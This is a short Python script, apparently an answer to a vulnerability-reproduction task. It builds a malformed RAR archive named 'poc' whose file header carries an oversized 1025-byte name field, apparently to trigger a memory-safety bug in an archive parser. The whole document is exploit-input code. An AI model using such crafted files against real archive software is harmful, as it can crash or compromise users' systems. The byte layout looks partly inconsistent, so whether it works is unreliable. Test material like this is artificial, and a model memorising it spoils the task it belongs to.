class Solution:
    def solve(self, src_path: str) -> bytes:
        sig = b"Rar!\x05\x00"
        main_block = b"\x0E\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x01\x00\x00"
        file_header_size = b"\x26\x04\x00\x00"
        file_type = b"\x30"
        file_flags = b"\x00\x00"
        unp_size = b"\x00" * 8
        host_os = b"\x00"
        file_crc = b"\x00" * 4
        file_time = b"\x00" * 8
        unp_ver = b"\x00\x00"
        method = b"\x30"
        file_attr = b"\x00" * 4
        name_prefix = b"\x81\x08"
        name_data = b"A" * 1025
        file_body = unp_size + host_os + file_crc + file_time + unp_ver + method + file_attr + name_prefix + name_data
        file_header = file_header_size + file_type + file_flags + file_body
        end_block = b"\x07\x00\x00\x00\x00\x00\x00"
        poc = sig + main_block + file_header + end_block
        return poc